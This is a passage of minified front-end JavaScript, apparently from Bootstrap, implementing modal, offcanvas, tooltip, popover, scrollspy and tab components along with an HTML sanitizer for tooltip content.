ody.classList.remove(CLASS_NAME_OPEN),this._resetAdjustments(),this._scrollBar.reset(),EventHandler.trigger(this._element,EVENT_HIDDEN$4)})}_isAnimated(){return this._element.classList.contains(CLASS_NAME_FADE$3)}_triggerBackdropTransition(){const hideEvent=EventHandler.trigger(this._element,EVENT_HIDE_PREVENTED$1);if(hideEvent.defaultPrevented)return;const isModalOverflowing=this._element.scrollHeight>document.documentElement.clientHeight,initialOverflowY=this._element.style.overflowY;if(initialOverflowY==="hidden"||this._element.classList.contains(CLASS_NAME_STATIC))return;isModalOverflowing||(this._element.style.overflowY="hidden"),this._element.classList.add(CLASS_NAME_STATIC),this._queueCallback(()=>{this._element.classList.remove(CLASS_NAME_STATIC),this._queueCallback(()=>{this._element.style.overflowY=initialOverflowY},this._dialog)},this._dialog),this._element.focus()}_adjustDialog(){const isModalOverflowing=this._element.scrollHeight>document.documentElement.clientHeight,scrollbarWidth=this._scrollBar.getWidth(),isBodyOverflowing=scrollbarWidth>0;if(isBodyOverflowing&&!isModalOverflowing){const property=isRTL()?"paddingLeft":"paddingRight";this._element.style[property]=`${scrollbarWidth}px`}if(!isBodyOverflowing&&isModalOverflowing){const property=isRTL()?"paddingRight":"paddingLeft";this._element.style[property]=`${scrollbarWidth}px`}}_resetAdjustments(){this._element.style.paddingLeft="",this._element.style.paddingRight=""}static jQueryInterface(config,relatedTarget){return this.each(function(){const data=Modal.getOrCreateInstance(this,config);if(typeof config!="string")return;if(typeof data[config]=="undefined")throw new TypeError(`No method named "${config}"`);data[config](relatedTarget)})}}EventHandler.on(document,EVENT_CLICK_DATA_API$2,SELECTOR_DATA_TOGGLE$2,function(event){const target=SelectorEngine.getElementFromSelector(this);["A","AREA"].includes(this.tagName)&&event.preventDefault(),EventHandler.one(target,EVENT_SHOW$4,showEvent=>{if(showEvent.defaultPrevented)return;EventHandler.one(target,EVENT_HIDDEN$4,()=>{isVisible(this)&&this.focus()})});const alreadyOpen=SelectorEngine.findOne(OPEN_SELECTOR$1);alreadyOpen&&Modal.getInstance(alreadyOpen).hide();const data=Modal.getOrCreateInstance(target);data.toggle(this)}),enableDismissTrigger(Modal),defineJQueryPlugin(Modal);const NAME$6="offcanvas",DATA_KEY$3="bs.offcanvas",EVENT_KEY$3=`.${DATA_KEY$3}`,DATA_API_KEY$1=".data-api",EVENT_LOAD_DATA_API$2=`load${EVENT_KEY$3}${DATA_API_KEY$1}`,ESCAPE_KEY="Escape",CLASS_NAME_SHOW$3="show",CLASS_NAME_SHOWING$1="showing",CLASS_NAME_HIDING="hiding",CLASS_NAME_BACKDROP="offcanvas-backdrop",OPEN_SELECTOR=".offcanvas.show",EVENT_SHOW$3=`show${EVENT_KEY$3}`,EVENT_SHOWN$3=`shown${EVENT_KEY$3}`,EVENT_HIDE$3=`hide${EVENT_KEY$3}`,EVENT_HIDE_PREVENTED=`hidePrevented${EVENT_KEY$3}`,EVENT_HIDDEN$3=`hidden${EVENT_KEY$3}`,EVENT_RESIZE=`resize${EVENT_KEY$3}`,EVENT_CLICK_DATA_API$1=`click${EVENT_KEY$3}${DATA_API_KEY$1}`,EVENT_KEYDOWN_DISMISS=`keydown.dismiss${EVENT_KEY$3}`,SELECTOR_DATA_TOGGLE$1='[data-bs-toggle="offcanvas"]',Default$5={backdrop:!0,keyboard:!0,scroll:!1},DefaultType$5={backdrop:"(boolean|string)",keyboard:"boolean",scroll:"boolean"};class Offcanvas extends BaseComponent{constructor(element,config){super(element,config),this._isShown=!1,this._backdrop=this._initializeBackDrop(),this._focustrap=this._initializeFocusTrap(),this._addEventListeners()}static get Default(){return Default$5}static get DefaultType(){return DefaultType$5}static get NAME(){return NAME$6}toggle(relatedTarget){return this._isShown?this.hide():this.show(relatedTarget)}show(relatedTarget){if(this._isShown)return;const showEvent=EventHandler.trigger(this._element,EVENT_SHOW$3,{relatedTarget});if(showEvent.defaultPrevented)return;this._isShown=!0,this._backdrop.show(),this._config.scroll||(new ScrollBarHelper).hide(),this._element.setAttribute("aria-modal",!0),this._element.setAttribute("role","dialog"),this._element.classList.add(CLASS_NAME_SHOWING$1);const completeCallBack=()=>{(!this._config.scroll||this._config.backdrop)&&this._focustrap.activate(),this._element.classList.add(CLASS_NAME_SHOW$3),this._element.classList.remove(CLASS_NAME_SHOWING$1),EventHandler.trigger(this._element,EVENT_SHOWN$3,{relatedTarget})};this._queueCallback(completeCallBack,this._element,!0)}hide(){if(!this._isShown)return;const hideEvent=EventHandler.trigger(this._element,EVENT_HIDE$3);if(hideEvent.defaultPrevented)return;this._focustrap.deactivate(),this._element.blur(),this._isShown=!1,this._element.classList.add(CLASS_NAME_HIDING),this._backdrop.hide();const completeCallback=()=>{this._element.classList.remove(CLASS_NAME_SHOW$3,CLASS_NAME_HIDING),this._element.removeAttribute("aria-modal"),this._element.removeAttribute("role"),this._config.scroll||(new ScrollBarHelper).reset(),EventHandler.trigger(this._element,EVENT_HIDDEN$3)};this._queueCallback(completeCallback,this._element,!0)}dispose(){this._backdrop.dispose(),this._focustrap.deactivate(),super.dispose()}_initializeBackDrop(){const clickCallback=()=>{if(this._config.backdrop==="static"){EventHandler.trigger(this._element,EVENT_HIDE_PREVENTED);return}this.hide()},isVisible=Boolean(this._config.backdrop);return new Backdrop({className:CLASS_NAME_BACKDROP,isVisible,isAnimated:!0,rootElement:this._element.parentNode,clickCallback:isVisible?clickCallback:null})}_initializeFocusTrap(){return new FocusTrap({trapElement:this._element})}_addEventListeners(){EventHandler.on(this._element,EVENT_KEYDOWN_DISMISS,event=>{if(event.key!==ESCAPE_KEY)return;if(this._config.keyboard){this.hide();return}EventHandler.trigger(this._element,EVENT_HIDE_PREVENTED)})}static jQueryInterface(config){return this.each(function(){const data=Offcanvas.getOrCreateInstance(this,config);if(typeof config!="string")return;if(data[config]===void 0||config.startsWith("_")||config==="constructor")throw new TypeError(`No method named "${config}"`);data[config](this)})}}EventHandler.on(document,EVENT_CLICK_DATA_API$1,SELECTOR_DATA_TOGGLE$1,function(event){const target=SelectorEngine.getElementFromSelector(this);if(["A","AREA"].includes(this.tagName)&&event.preventDefault(),isDisabled(this))return;EventHandler.one(target,EVENT_HIDDEN$3,()=>{isVisible(this)&&this.focus()});const alreadyOpen=SelectorEngine.findOne(OPEN_SELECTOR);alreadyOpen&&alreadyOpen!==target&&Offcanvas.getInstance(alreadyOpen).hide();const data=Offcanvas.getOrCreateInstance(target);data.toggle(this)}),EventHandler.on(window,EVENT_LOAD_DATA_API$2,()=>{for(const selector of SelectorEngine.find(OPEN_SELECTOR))Offcanvas.getOrCreateInstance(selector).show()}),EventHandler.on(window,EVENT_RESIZE,()=>{for(const element of SelectorEngine.find("[aria-modal][class*=show][class*=offcanvas-]"))getComputedStyle(element).position!=="fixed"&&Offcanvas.getOrCreateInstance(element).hide()}),enableDismissTrigger(Offcanvas),defineJQueryPlugin(Offcanvas);const ARIA_ATTRIBUTE_PATTERN=/^aria-[\w-]*$/i,DefaultAllowlist={"*":["class","dir","id","lang","role",ARIA_ATTRIBUTE_PATTERN],a:["target","href","title","rel"],area:[],b:[],br:[],col:[],code:[],dd:[],div:[],dl:[],dt:[],em:[],hr:[],h1:[],h2:[],h3:[],h4:[],h5:[],h6:[],i:[],img:["src","srcset","alt","title","width","height"],li:[],ol:[],p:[],pre:[],s:[],small:[],span:[],sub:[],sup:[],strong:[],u:[],ul:[]},uriAttributes=new Set(["background","cite","href","itemtype","longdesc","poster","src","xlink:href"]),SAFE_URL_PATTERN=/^(?!javascript:)(?:[a-z0-9+.-]+:|[^&:/?#]*(?:[/?#]|$))/i,allowedAttribute=(attribute,allowedAttributeList)=>{const attributeName=attribute.nodeName.toLowerCase();return allowedAttributeList.includes(attributeName)?!uriAttributes.has(attributeName)||Boolean(SAFE_URL_PATTERN.test(attribute.nodeValue)):allowedAttributeList.filter(attributeRegex=>attributeRegex instanceof RegExp).some(regex=>regex.test(attributeName))};function sanitizeHtml(unsafeHtml,allowList,sanitizeFunction){if(!unsafeHtml.length)return unsafeHtml;if(sanitizeFunction&&typeof sanitizeFunction=="function")return sanitizeFunction(unsafeHtml);const domParser=new window.DOMParser,createdDocument=domParser.parseFromString(unsafeHtml,"text/html"),elements=[].concat(...createdDocument.body.querySelectorAll("*"));for(const element of elements){const elementName=element.nodeName.toLowerCase();if(!Object.keys(allowList).includes(elementName)){element.remove();continue}const attributeList=[].concat(...element.attributes),allowedAttributes=[].concat(allowList["*"]||[],allowList[elementName]||[]);for(const attribute of attributeList)allowedAttribute(attribute,allowedAttributes)||element.removeAttribute(attribute.nodeName)}return createdDocument.body.innerHTML}const NAME$5="TemplateFactory",Default$4={allowList:DefaultAllowlist,content:{},extraClass:"",html:!1,sanitize:!0,sanitizeFn:null,template:"<div></div>"},DefaultType$4={allowList:"object",content:"object",extraClass:"(string|function)",html:"boolean",sanitize:"boolean",sanitizeFn:"(null|function)",template:"string"},DefaultContentType={entry:"(string|element|function|null)",selector:"(string|element)"};class TemplateFactory extends Config{constructor(config){super(),this._config=this._getConfig(config)}static get Default(){return Default$4}static get DefaultType(){return DefaultType$4}static get NAME(){return NAME$5}getContent(){return Object.values(this._config.content).map(config=>this._resolvePossibleFunction(config)).filter(Boolean)}hasContent(){return this.getContent().length>0}changeContent(content){return this._checkContent(content),this._config.content={...this._config.content,...content},this}toHtml(){const templateWrapper=document.createElement("div");templateWrapper.innerHTML=this._maybeSanitize(this._config.template);for(const[selector,text]of Object.entries(this._config.content))this._setContent(templateWrapper,text,selector);const template=templateWrapper.children[0],extraClass=this._resolvePossibleFunction(this._config.extraClass);return extraClass&&template.classList.add(...extraClass.split(" ")),template}_typeCheckConfig(config){super._typeCheckConfig(config),this._checkContent(config.content)}_checkContent(arg){for(const[selector,content]of Object.entries(arg))super._typeCheckConfig({selector,entry:content},DefaultContentType)}_setContent(template,content,selector){const templateElement=SelectorEngine.findOne(selector,template);if(!templateElement)return;if(content=this._resolvePossibleFunction(content),!content){templateElement.remove();return}if(isElement$1(content)){this._putElementInTemplate(getElement(content),templateElement);return}if(this._config.html){templateElement.innerHTML=this._maybeSanitize(content);return}templateElement.textContent=content}_maybeSanitize(arg){return this._config.sanitize?sanitizeHtml(arg,this._config.allowList,this._config.sanitizeFn):arg}_resolvePossibleFunction(arg){return execute(arg,[this])}_putElementInTemplate(element,templateElement){if(this._config.html){templateElement.innerHTML="",templateElement.append(element);return}templateElement.textContent=element.textContent}}const NAME$4="tooltip",DISALLOWED_ATTRIBUTES=new Set(["sanitize","allowList","sanitizeFn"]),CLASS_NAME_FADE$2="fade",CLASS_NAME_MODAL="modal",CLASS_NAME_SHOW$2="show",SELECTOR_TOOLTIP_INNER=".tooltip-inner",SELECTOR_MODAL=`.${CLASS_NAME_MODAL}`,EVENT_MODAL_HIDE="hide.bs.modal",TRIGGER_HOVER="hover",TRIGGER_FOCUS="focus",TRIGGER_CLICK="click",TRIGGER_MANUAL="manual",EVENT_HIDE$2="hide",EVENT_HIDDEN$2="hidden",EVENT_SHOW$2="show",EVENT_SHOWN$2="shown",EVENT_INSERTED="inserted",EVENT_CLICK$1="click",EVENT_FOCUSIN$1="focusin",EVENT_FOCUSOUT$1="focusout",EVENT_MOUSEENTER="mouseenter",EVENT_MOUSELEAVE="mouseleave",AttachmentMap={AUTO:"auto",TOP:"top",RIGHT:isRTL()?"left":"right",BOTTOM:"bottom",LEFT:isRTL()?"right":"left"},Default$3={allowList:DefaultAllowlist,animation:!0,boundary:"clippingParents",container:!1,customClass:"",delay:0,fallbackPlacements:["top","right","bottom","left"],html:!1,offset:[0,6],placement:"top",popperConfig:null,sanitize:!0,sanitizeFn:null,selector:!1,template:'<div class="tooltip" role="tooltip"><div class="tooltip-arrow"></div><div class="tooltip-inner"></div></div>',title:"",trigger:"hover focus"},DefaultType$3={allowList:"object",animation:"boolean",boundary:"(string|element)",container:"(string|element|boolean)",customClass:"(string|function)",delay:"(number|object)",fallbackPlacements:"array",html:"boolean",offset:"(array|string|function)",placement:"(string|function)",popperConfig:"(null|object|function)",sanitize:"boolean",sanitizeFn:"(null|function)",selector:"(string|boolean)",template:"string",title:"(string|element|function)",trigger:"string"};class Tooltip extends BaseComponent{constructor(element,config){if(typeof Popper=="undefined")throw new TypeError("Bootstrap's tooltips require Popper (https://popper.js.org)");super(element,config),this._isEnabled=!0,this._timeout=0,this._isHovered=null,this._activeTrigger={},this._popper=null,this._templateFactory=null,this._newContent=null,this.tip=null,this._setListeners(),this._config.selector||this._fixTitle()}static get Default(){return Default$3}static get DefaultType(){return DefaultType$3}static get NAME(){return NAME$4}enable(){this._isEnabled=!0}disable(){this._isEnabled=!1}toggleEnabled(){this._isEnabled=!this._isEnabled}toggle(){if(!this._isEnabled)return;if(this._activeTrigger.click=!this._activeTrigger.click,this._isShown()){this._leave();return}this._enter()}dispose(){clearTimeout(this._timeout),EventHandler.off(this._element.closest(SELECTOR_MODAL),EVENT_MODAL_HIDE,this._hideModalHandler),this._element.getAttribute("data-bs-original-title")&&this._element.setAttribute("title",this._element.getAttribute("data-bs-original-title")),this._disposePopper(),super.dispose()}show(){if(this._element.style.display==="none")throw new Error("Please use show on visible elements");if(!this._isWithContent()||!this._isEnabled)return;const showEvent=EventHandler.trigger(this._element,this.constructor.eventName(EVENT_SHOW$2)),shadowRoot=findShadowRoot(this._element),isInTheDom=(shadowRoot||this._element.ownerDocument.documentElement).contains(this._element);if(showEvent.defaultPrevented||!isInTheDom)return;this._disposePopper();const tip=this._getTipElement();this._element.setAttribute("aria-describedby",tip.getAttribute("id"));const{container}=this._config;if(this._element.ownerDocument.documentElement.contains(this.tip)||(container.append(tip),EventHandler.trigger(this._element,this.constructor.eventName(EVENT_INSERTED))),this._popper=this._createPopper(tip),tip.classList.add(CLASS_NAME_SHOW$2),"ontouchstart"in document.documentElement)for(const element of[].concat(...document.body.children))EventHandler.on(element,"mouseover",noop);const complete=()=>{EventHandler.trigger(this._element,this.constructor.eventName(EVENT_SHOWN$2)),this._isHovered===!1&&this._leave(),this._isHovered=!1};this._queueCallback(complete,this.tip,this._isAnimated())}hide(){if(!this._isShown())return;const hideEvent=EventHandler.trigger(this._element,this.constructor.eventName(EVENT_HIDE$2));if(hideEvent.defaultPrevented)return;const tip=this._getTipElement();if(tip.classList.remove(CLASS_NAME_SHOW$2),"ontouchstart"in document.documentElement)for(const element of[].concat(...document.body.children))EventHandler.off(element,"mouseover",noop);this._activeTrigger[TRIGGER_CLICK]=!1,this._activeTrigger[TRIGGER_FOCUS]=!1,this._activeTrigger[TRIGGER_HOVER]=!1,this._isHovered=null;const complete=()=>{if(this._isWithActiveTrigger())return;this._isHovered||this._disposePopper(),this._element.removeAttribute("aria-describedby"),EventHandler.trigger(this._element,this.constructor.eventName(EVENT_HIDDEN$2))};this._queueCallback(complete,this.tip,this._isAnimated())}update(){this._popper&&this._popper.update()}_isWithContent(){return Boolean(this._getTitle())}_getTipElement(){return this.tip||(this.tip=this._createTipElement(this._newContent||this._getContentForTemplate())),this.tip}_createTipElement(content){const tip=this._getTemplateFactory(content).toHtml();if(!tip)return null;tip.classList.remove(CLASS_NAME_FADE$2,CLASS_NAME_SHOW$2),tip.classList.add(`bs-${this.constructor.NAME}-auto`);const tipId=getUID(this.constructor.NAME).toString();return tip.setAttribute("id",tipId),this._isAnimated()&&tip.classList.add(CLASS_NAME_FADE$2),tip}setContent(content){this._newContent=content,this._isShown()&&(this._disposePopper(),this.show())}_getTemplateFactory(content){return this._templateFactory?this._templateFactory.changeContent(content):this._templateFactory=new TemplateFactory({...this._config,content,extraClass:this._resolvePossibleFunction(this._config.customClass)}),this._templateFactory}_getContentForTemplate(){return{[SELECTOR_TOOLTIP_INNER]:this._getTitle()}}_getTitle(){return this._resolvePossibleFunction(this._config.title)||this._element.getAttribute("data-bs-original-title")}_initializeOnDelegatedTarget(event){return this.constructor.getOrCreateInstance(event.delegateTarget,this._getDelegateConfig())}_isAnimated(){return this._config.animation||this.tip&&this.tip.classList.contains(CLASS_NAME_FADE$2)}_isShown(){return this.tip&&this.tip.classList.contains(CLASS_NAME_SHOW$2)}_createPopper(tip){const placement=execute(this._config.placement,[this,tip,this._element]),attachment=AttachmentMap[placement.toUpperCase()];return createPopper(this._element,tip,this._getPopperConfig(attachment))}_getOffset(){const{offset}=this._config;return typeof offset=="string"?offset.split(",").map(value=>Number.parseInt(value,10)):typeof offset=="function"?popperData=>offset(popperData,this._element):offset}_resolvePossibleFunction(arg){return execute(arg,[this._element])}_getPopperConfig(attachment){const defaultBsPopperConfig={placement:attachment,modifiers:[{name:"flip",options:{fallbackPlacements:this._config.fallbackPlacements}},{name:"offset",options:{offset:this._getOffset()}},{name:"preventOverflow",options:{boundary:this._config.boundary}},{name:"arrow",options:{element:`.${this.constructor.NAME}-arrow`}},{name:"preSetPlacement",enabled:!0,phase:"beforeMain",fn:data=>{this._getTipElement().setAttribute("data-popper-placement",data.state.placement)}}]};return{...defaultBsPopperConfig,...execute(this._config.popperConfig,[defaultBsPopperConfig])}}_setListeners(){const triggers=this._config.trigger.split(" ");for(const trigger of triggers)if(trigger==="click")EventHandler.on(this._element,this.constructor.eventName(EVENT_CLICK$1),this._config.selector,event=>{const context=this._initializeOnDelegatedTarget(event);context.toggle()});else if(trigger!==TRIGGER_MANUAL){const eventIn=trigger===TRIGGER_HOVER?this.constructor.eventName(EVENT_MOUSEENTER):this.constructor.eventName(EVENT_FOCUSIN$1),eventOut=trigger===TRIGGER_HOVER?this.constructor.eventName(EVENT_MOUSELEAVE):this.constructor.eventName(EVENT_FOCUSOUT$1);EventHandler.on(this._element,eventIn,this._config.selector,event=>{const context=this._initializeOnDelegatedTarget(event);context._activeTrigger[event.type==="focusin"?TRIGGER_FOCUS:TRIGGER_HOVER]=!0,context._enter()}),EventHandler.on(this._element,eventOut,this._config.selector,event=>{const context=this._initializeOnDelegatedTarget(event);context._activeTrigger[event.type==="focusout"?TRIGGER_FOCUS:TRIGGER_HOVER]=context._element.contains(event.relatedTarget),context._leave()})}this._hideModalHandler=()=>{this._element&&this.hide()},EventHandler.on(this._element.closest(SELECTOR_MODAL),EVENT_MODAL_HIDE,this._hideModalHandler)}_fixTitle(){const title=this._element.getAttribute("title");if(!title)return;!this._element.getAttribute("aria-label")&&!this._element.textContent.trim()&&this._element.setAttribute("aria-label",title),this._element.setAttribute("data-bs-original-title",title),this._element.removeAttribute("title")}_enter(){if(this._isShown()||this._isHovered){this._isHovered=!0;return}this._isHovered=!0,this._setTimeout(()=>{this._isHovered&&this.show()},this._config.delay.show)}_leave(){if(this._isWithActiveTrigger())return;this._isHovered=!1,this._setTimeout(()=>{this._isHovered||this.hide()},this._config.delay.hide)}_setTimeout(handler,timeout){clearTimeout(this._timeout),this._timeout=setTimeout(handler,timeout)}_isWithActiveTrigger(){return Object.values(this._activeTrigger).includes(!0)}_getConfig(config){const dataAttributes=Manipulator.getDataAttributes(this._element);for(const dataAttribute of Object.keys(dataAttributes))DISALLOWED_ATTRIBUTES.has(dataAttribute)&&delete dataAttributes[dataAttribute];return config={...dataAttributes,...typeof config=="object"&&config?config:{}},config=this._mergeConfigObj(config),config=this._configAfterMerge(config),this._typeCheckConfig(config),config}_configAfterMerge(config){return config.container=config.container===!1?document.body:getElement(config.container),typeof config.delay=="number"&&(config.delay={show:config.delay,hide:config.delay}),typeof config.title=="number"&&(config.title=config.title.toString()),typeof config.content=="number"&&(config.content=config.content.toString()),config}_getDelegateConfig(){const config={};for(const[key,value]of Object.entries(this._config))this.constructor.Default[key]!==value&&(config[key]=value);return config.selector=!1,config.trigger="manual",config}_disposePopper(){this._popper&&(this._popper.destroy(),this._popper=null),this.tip&&(this.tip.remove(),this.tip=null)}static jQueryInterface(config){return this.each(function(){const data=Tooltip.getOrCreateInstance(this,config);if(typeof config!="string")return;if(typeof data[config]=="undefined")throw new TypeError(`No method named "${config}"`);data[config]()})}}defineJQueryPlugin(Tooltip);const NAME$3="popover",SELECTOR_TITLE=".popover-header",SELECTOR_CONTENT=".popover-body",Default$2={...Tooltip.Default,content:"",offset:[0,8],placement:"right",template:'<div class="popover" role="tooltip"><div class="popover-arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>',trigger:"click"},DefaultType$2={...Tooltip.DefaultType,content:"(null|string|element|function)"};class Popover extends Tooltip{static get Default(){return Default$2}static get DefaultType(){return DefaultType$2}static get NAME(){return NAME$3}_isWithContent(){return this._getTitle()||this._getContent()}_getContentForTemplate(){return{[SELECTOR_TITLE]:this._getTitle(),[SELECTOR_CONTENT]:this._getContent()}}_getContent(){return this._resolvePossibleFunction(this._config.content)}static jQueryInterface(config){return this.each(function(){const data=Popover.getOrCreateInstance(this,config);if(typeof config!="string")return;if(typeof data[config]=="undefined")throw new TypeError(`No method named "${config}"`);data[config]()})}}defineJQueryPlugin(Popover);const NAME$2="scrollspy",DATA_KEY$2="bs.scrollspy",EVENT_KEY$2=`.${DATA_KEY$2}`,DATA_API_KEY=".data-api",EVENT_ACTIVATE=`activate${EVENT_KEY$2}`,EVENT_CLICK=`click${EVENT_KEY$2}`,EVENT_LOAD_DATA_API$1=`load${EVENT_KEY$2}${DATA_API_KEY}`,CLASS_NAME_DROPDOWN_ITEM="dropdown-item",CLASS_NAME_ACTIVE$1="active",SELECTOR_DATA_SPY='[data-bs-spy="scroll"]',SELECTOR_TARGET_LINKS="[href]",SELECTOR_NAV_LIST_GROUP=".nav, .list-group",SELECTOR_NAV_LINKS=".nav-link",SELECTOR_NAV_ITEMS=".nav-item",SELECTOR_LIST_ITEMS=".list-group-item",SELECTOR_LINK_ITEMS=`${SELECTOR_NAV_LINKS}, ${SELECTOR_NAV_ITEMS} > ${SELECTOR_NAV_LINKS}, ${SELECTOR_LIST_ITEMS}`,SELECTOR_DROPDOWN=".dropdown",SELECTOR_DROPDOWN_TOGGLE$1=".dropdown-toggle",Default$1={offset:null,rootMargin:"0px 0px -25%",smoothScroll:!1,target:null,threshold:[.1,.5,1]},DefaultType$1={offset:"(number|null)",rootMargin:"string",smoothScroll:"boolean",target:"element",threshold:"array"};class ScrollSpy extends BaseComponent{constructor(element,config){super(element,config),this._targetLinks=new Map,this._observableSections=new Map,this._rootElement=getComputedStyle(this._element).overflowY==="visible"?null:this._element,this._activeTarget=null,this._observer=null,this._previousScrollData={visibleEntryTop:0,parentScrollTop:0},this.refresh()}static get Default(){return Default$1}static get DefaultType(){return DefaultType$1}static get NAME(){return NAME$2}refresh(){this._initializeTargetsAndObservables(),this._maybeEnableSmoothScroll(),this._observer?this._observer.disconnect():this._observer=this._getNewObserver();for(const section of this._observableSections.values())this._observer.observe(section)}dispose(){this._observer.disconnect(),super.dispose()}_configAfterMerge(config){return config.target=getElement(config.target)||document.body,config.rootMargin=config.offset?`${config.offset}px 0px -30%`:config.rootMargin,typeof config.threshold=="string"&&(config.threshold=config.threshold.split(",").map(value=>Number.parseFloat(value))),config}_maybeEnableSmoothScroll(){if(!this._config.smoothScroll)return;EventHandler.off(this._config.target,EVENT_CLICK),EventHandler.on(this._config.target,EVENT_CLICK,SELECTOR_TARGET_LINKS,event=>{const observableSection=this._observableSections.get(event.target.hash);if(observableSection){event.preventDefault();const root=this._rootElement||window,height=observableSection.offsetTop-this._element.offsetTop;if(root.scrollTo){root.scrollTo({top:height,behavior:"smooth"});return}root.scrollTop=height}})}_getNewObserver(){const options={root:this._rootElement,threshold:this._config.threshold,rootMargin:this._config.rootMargin};return new IntersectionObserver(entries=>this._observerCallback(entries),options)}_observerCallback(entries){const targetElement=entry=>this._targetLinks.get(`#${entry.target.id}`),activate=entry=>{this._previousScrollData.visibleEntryTop=entry.target.offsetTop,this._process(targetElement(entry))},parentScrollTop=(this._rootElement||document.documentElement).scrollTop,userScrollsDown=parentScrollTop>=this._previousScrollData.parentScrollTop;this._previousScrollData.parentScrollTop=parentScrollTop;for(const entry of entries){if(!entry.isIntersecting){this._activeTarget=null,this._clearActiveClass(targetElement(entry));continue}const entryIsLowerThanPrevious=entry.target.offsetTop>=this._previousScrollData.visibleEntryTop;if(userScrollsDown&&entryIsLowerThanPrevious){if(activate(entry),!parentScrollTop)return;continue}!userScrollsDown&&!entryIsLowerThanPrevious&&activate(entry)}}_initializeTargetsAndObservables(){this._targetLinks=new Map,this._observableSections=new Map;const targetLinks=SelectorEngine.find(SELECTOR_TARGET_LINKS,this._config.target);for(const anchor of targetLinks){if(!anchor.hash||isDisabled(anchor))continue;const observableSection=SelectorEngine.findOne(decodeURI(anchor.hash),this._element);isVisible(observableSection)&&(this._targetLinks.set(decodeURI(anchor.hash),anchor),this._observableSections.set(anchor.hash,observableSection))}}_process(target){if(this._activeTarget===target)return;this._clearActiveClass(this._config.target),this._activeTarget=target,target.classList.add(CLASS_NAME_ACTIVE$1),this._activateParents(target),EventHandler.trigger(this._element,EVENT_ACTIVATE,{relatedTarget:target})}_activateParents(target){if(target.classList.contains(CLASS_NAME_DROPDOWN_ITEM)){SelectorEngine.findOne(SELECTOR_DROPDOWN_TOGGLE$1,target.closest(SELECTOR_DROPDOWN)).classList.add(CLASS_NAME_ACTIVE$1);return}for(const listGroup of SelectorEngine.parents(target,SELECTOR_NAV_LIST_GROUP))for(const item of SelectorEngine.prev(listGroup,SELECTOR_LINK_ITEMS))item.classList.add(CLASS_NAME_ACTIVE$1)}_clearActiveClass(parent){parent.classList.remove(CLASS_NAME_ACTIVE$1);const activeNodes=SelectorEngine.find(`${SELECTOR_TARGET_LINKS}.${CLASS_NAME_ACTIVE$1}`,parent);for(const node of activeNodes)node.classList.remove(CLASS_NAME_ACTIVE$1)}static jQueryInterface(config){return this.each(function(){const data=ScrollSpy.getOrCreateInstance(this,config);if(typeof config!="string")return;if(data[config]===void 0||config.startsWith("_")||config==="constructor")throw new TypeError(`No method named "${config}"`);data[config]()})}}EventHandler.on(window,EVENT_LOAD_DATA_API$1,()=>{for(const spy of SelectorEngine.find(SELECTOR_DATA_SPY))ScrollSpy.getOrCreateInstance(spy)}),defineJQueryPlugin(ScrollSpy);const NAME$1="tab",DATA_KEY$1="bs.tab",EVENT_KEY$1=`.${DATA_KEY$1}`,EVENT_HIDE$1=`hide${EVENT_KEY$1}`,EVENT_HIDDEN$1=`hidden${EVENT_KEY$1}`,EVENT_SHOW$1=`show${EVENT_KEY$1}`,EVENT_SHOWN$1=`shown${EVENT_KEY$1}`,EVENT_CLICK_DATA_API=`click${EVENT_KEY$1}`,EVENT_KEYDOWN=`keydown${EVENT_KEY$1}`,EVENT_LOAD_DATA_API=`load${EVENT_KEY$1}`,ARROW_LEFT_KEY="ArrowLeft",ARROW_RIGHT_KEY="ArrowRight",ARROW_UP_KEY="ArrowUp",ARROW_DOWN_KEY="ArrowDown",HOME_KEY="Home",END_KEY="End",CLASS_NAME_ACTIVE="active",CLASS_NAME_FADE$1="fade",CLASS_NAME_SHOW$1="show",CLASS_DROPDOWN="dropdown",SELECTOR_DROPDOWN_TOGGLE=".dropdown-toggle",SELECTOR_DROPDOWN_MENU=".dropdown-menu",NOT_SELECTOR_DROPDOWN_TOGGLE=`:not(${SELECTOR_DROPDOWN_TOGGLE})`,SELECTOR_TAB_PANEL='.list-group, .nav, [role="tablist"]',SELECTOR_OUTER=".nav-item, .list-group-item",SELECTOR_INNER=`.nav-link${NOT_SELECTOR_DROPDOWN_TOGGLE}, .list-group-item${NOT_SELECTOR_DROPDOWN_TOGGLE}, [role="tab"]${NOT_SELECTOR_DROPDOWN_TOGGLE}`,SELECTOR_DATA_TOGGLE='[data-bs-toggle="tab"], [data-bs-toggle="pill"], [data-bs-toggle="list"]',SELECTOR_INNER_ELEM=`${SELECTOR_INNER}, ${SELECTOR_DATA_TOGGLE}`,SELECTOR_DATA_TOGGLE_ACTIVE=`.${CLASS_NAME_ACTIVE}[data-bs-toggle="tab"], .${CLASS_NAME_ACTIVE}[data-bs-toggle="pill"], .${CLASS_NAME_ACTIVE}[data-bs-toggle="list"]`;class Tab extends BaseComponent{constructor(element){if(super(element),this._parent=this._element.closest(SELECTOR_TAB_PANEL),!this._parent)return;this._setInitialAttributes(this._parent,this._getChildren()),EventHandler.on(this._element,EVENT_KEYDOWN,event=>this._keydown(event))}static get NAME(){return NAME$1}show(){const innerElem=this._element;if(this._elemIsActive(innerElem))return;const active=this._getActiveElem(),hideEvent=active?EventHandler.trigger(active,EVENT_HIDE$1,{relatedTarget:innerElem}):null,showEvent=EventHandler.trigger(innerElem,EVENT_SHOW$1,{relatedTarget:active});if(showEvent.defaultPrevented||hideEvent&&hideEvent.defaultPrevented)return;this._deactivate(active,innerElem),this._activate(innerElem,active)}_activate(element,relatedElem){if(!element)return;element.classList.add(CLASS_NAME_ACTIVE),this._activate(SelectorEngine.getElementFromSelector(element));const complete=()=>{if(element.getAttribute("role")!=="tab"){element.classList.add(CLASS_NAME_SHOW$1);return}element.removeAttribute("tabindex"),element.setAttribute("aria-selected",!0),this._toggleDropDown(element,!0),EventHandler.trigger(element,EVENT_SHOWN$1,{relatedTarget:relatedElem})};this._queueCallback(complete,element,element.classList.contains(CLASS_NAME_FADE$1))}_deactivate(element,relatedElem){if(!element)return;element.classList.remove(CLASS_NAME_ACTIVE),element.blur(),this._deactivate(SelectorEngine.getElementFromSelector(element));const 